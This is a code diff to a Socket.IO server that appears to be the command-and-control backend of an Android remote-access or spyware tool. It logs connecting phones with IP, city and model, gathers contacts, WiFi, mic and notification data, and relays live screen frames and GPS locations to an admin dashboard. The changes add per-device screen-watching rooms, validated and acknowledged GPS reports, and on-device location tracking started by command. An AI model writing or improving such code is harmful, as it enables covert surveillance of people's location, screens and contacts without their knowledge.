@@ -23,6 +23,8 @@ interface TransferChunk {
   receivedAt: number;
 }
 
+type SocketAck = (response: { success: boolean; error?: string }) => void;
+
 class SocketService {
   private io!: SocketIOServer;
   private fastifyApp!: FastifyInstance;
@@ -84,6 +86,16 @@ class SocketService {
 
   private handleAdminConnection(socket: Socket): void {
     socket.join('admin');
+    socket.on('screen:subscribe', (payload: { id?: string }) => {
+      if (typeof payload?.id === 'string' && payload.id.length > 0 && payload.id.length <= 256) {
+        socket.join(`screen:${payload.id}`);
+      }
+    });
+    socket.on('screen:unsubscribe', (payload: { id?: string }) => {
+      if (typeof payload?.id === 'string' && payload.id.length > 0) {
+        socket.leave(`screen:${payload.id}`);
+      }
+    });
     log.info('Admin frontend connected to Socket.IO');
     socket.on('disconnect', () => { log.info('Admin frontend disconnected from Socket.IO'); });
   }
@@ -134,9 +146,9 @@ class SocketService {
     dbHelpers.addLog('CONNECTION', 'CLIENT', `Client ${id} connected from ${ip}`, JSON.stringify({ ip, country, city, model, manf }));
     this.io.to('admin').emit('client:connect', { id, model, ip });
 
+    this.setupHandlers(socket, id);
     this.runQueuedCommands(id);
     this.restoreGpsPolling(id);
-    this.setupHandlers(socket, id);
 
     socket.on('disconnect', () => this.handleDisconnect(id, socket));
     socket.on('error', (err) => { log.error(`Socket error for ${id}: ${err instanceof Error ? err.message : String(err)}`); });
@@ -160,7 +172,7 @@ class SocketService {
     // Clear stale real-time status data so frontend doesn't show outdated badges
     dbHelpers.setClientData(id, 'notification_status', '[]');
     dbHelpers.setClientData(id, 'mic_status', '[]');
-    this.io.to('admin').emit('screen:stopped', { id });
+    this.io.to(`screen:${id}`).emit('screen:stopped', { id });
     this.io.to('admin').emit('client:disconnect', { id });
   }
 
@@ -235,15 +247,45 @@ class SocketService {
       } catch (err: unknown) { log.error(`Contacts handler error: ${err instanceof Error ? err.message : String(err)}`); }
     });
 
-    socket.on(CMD.LOCATION, (data: any) => {
+    socket.on(CMD.LOCATION, (data: any, ack?: SocketAck) => {
       try {
-        if (data.enabled === false || (data.latitude === undefined && data.longitude === undefined)) {
-          const errMsg = data.error || 'No location';
-          dbHelpers.addLog('DATA', 'GPS', `GPS unavailable from ${id}: ${errMsg}`);
-          dbHelpers.setClientData(id, 'gps_error', JSON.stringify({ error: errMsg }));
+        if (data?.status || typeof data?.tracking === 'boolean') {
+          dbHelpers.addLog('DATA', 'GPS', `GPS tracking status from ${id}`, JSON.stringify({
+            status: data.status || null,
+            tracking: data.tracking ?? null,
+            interval: data.interval ?? null,
+          }));
           broadcastData('gps');
+          if (typeof ack === 'function') ack({ success: true });
           return;
         }
+
+        if (data.enabled === false || (data.latitude === undefined && data.longitude === undefined)) {
+          const errMsg = data.error || 'No location';
+          const diagnostics = data.diagnostics && typeof data.diagnostics === 'object' ? data.diagnostics : null;
+          dbHelpers.addLog('DATA', 'GPS', `GPS unavailable from ${id}: ${errMsg}`, diagnostics ? JSON.stringify(diagnostics) : undefined);
+          dbHelpers.setClientData(id, 'gps_error', JSON.stringify({
+            error: errMsg,
+            diagnostics,
+            time: new Date().toISOString(),
+          }));
+          broadcastData('gps');
+          if (typeof ack === 'function') ack({ success: false, error: errMsg });
+          return;
+        }
+
+        const latitude = Number(data.latitude);
+        const longitude = Number(data.longitude);
+        if (!Number.isFinite(latitude) || !Number.isFinite(longitude)) {
+          const errMsg = 'Invalid location coordinates';
+          dbHelpers.addLog('DATA', 'GPS', `GPS rejected from ${id}: ${errMsg}`, JSON.stringify({
+            latitude: data.latitude,
+            longitude: data.longitude,
+          }));
+          if (typeof ack === 'function') ack({ success: false, error: errMsg });
+          return;
+        }
+
         const gpsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'gps'));
         dbHelpers.setClientData(id, 'gps_error', JSON.stringify(null));
         // Normalize timestamp: old APKs send epoch millis, new APKs send ISO string
@@ -254,17 +296,27 @@ class SocketService {
           timeValue = new Date().toISOString();
         }
         const entry = {
-          latitude: data.latitude, longitude: data.longitude, accuracy: data.accuracy,
+          latitude, longitude, accuracy: data.accuracy,
           speed: data.speed, provider: data.provider,
           time: timeValue,
         };
         gpsData.push(entry);
         dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData));
-        dbHelpers.addLog('DATA', 'GPS', `GPS location from ${id}`, JSON.stringify({ lat: data.latitude, lng: data.longitude }));
+        dbHelpers.addLog('DATA', 'GPS', `GPS location from ${id}`, JSON.stringify({
+          lat: latitude,
+          lng: longitude,
+          queued: !!data.queued,
+          queueId: data.queueId ?? null,
+        }));
         broadcastData('gps');
         // Emit live GPS location to admin dashboard for real-time map
         this.io.to('admin').emit('gps:location', { id, ...entry });
-      } catch (err: unknown) { log.error(`GPS handler error: ${err instanceof Error ? err.message : String(err)}`); }
+        if (typeof ack === 'function') ack({ success: true });
+      } catch (err: unknown) {
+        const message = err instanceof Error ? err.message : String(err);
+        if (typeof ack === 'function') ack({ success: false, error: message });
+        log.error(`GPS handler error: ${message}`);
+      }
     });
 
     socket.on(CMD.WIFI, (data: any) => {
@@ -495,25 +547,27 @@ class SocketService {
       try {
         if (data.type === 'frame' && data.frame) {
           // Relay frame directly to admin — not persisted
-          this.io.to('admin').emit('screen:frame', {
+          this.io.to(`screen:${id}`).emit('screen:frame', {
             id,
             frame: data.frame,
-            screenWidth: data.screenWidth,
-            screenHeight: data.screenHeight,
+            sequence: data.sequence,
           });
         } else if (data.type === 'status') {
-          this.io.to('admin').emit('screen:status', {
+          this.io.to(`screen:${id}`).emit('screen:status', {
             id,
             streaming: data.streaming,
             screenWidth: data.screenWidth,
             screenHeight: data.screenHeight,
+            densityDpi: data.densityDpi,
             fps: data.fps,
             quality: data.quality,
             accessible: data.accessible,
+            codec: data.codec,
+            frameTransport: data.frameTransport,
           });
           broadcastData('screen');
         } else if (data.type === 'error' && data.error) {
-          this.io.to('admin').emit('screen:error', { id, error: data.error });
+          this.io.to(`screen:${id}`).emit('screen:error', { id, error: data.error });
           dbHelpers.addLog('ERROR', 'SCREEN', `Screen error from ${id}: ${data.error}`);
         }
       } catch (err: unknown) { log.error(`Screen handler error: ${err instanceof Error ? err.message : String(err)}`); }
@@ -556,10 +610,10 @@ class SocketService {
     socket.on(CMD.SCREEN_CTRL, (data: any) => {
       try {
         if (data.accessible !== undefined) {
-          this.io.to('admin').emit('screen:status', { id, accessible: data.accessible });
+          this.io.to(`screen:${id}`).emit('screen:status', { id, accessible: data.accessible });
         }
         if (data.error) {
-          this.io.to('admin').emit('screen:error', { id, error: data.error });
+          this.io.to(`screen:${id}`).emit('screen:error', { id, error: data.error });
         }
       } catch (err: unknown) { log.error(`Screen control handler error: ${err instanceof Error ? err.message : String(err)}`); }
     });
@@ -619,9 +673,9 @@ class SocketService {
     if (oldTimer) { clearInterval(oldTimer); this.gpsTimers.delete(clientId); }
     d.update(clients).set({ gpsInterval: interval }).where(eq(clients.id, clientId)).run();
     if (interval > 0) {
-      this.send(clientId, CMD.LOCATION);
-      const timer = setInterval(() => { this.send(clientId, CMD.LOCATION); }, interval * 1000);
-      this.gpsTimers.set(clientId, timer);
+      this.send(clientId, CMD.LOCATION, { action: 'start', interval });
+    } else {
+      this.send(clientId, CMD.LOCATION, { action: 'stop' });
     }
   }
 
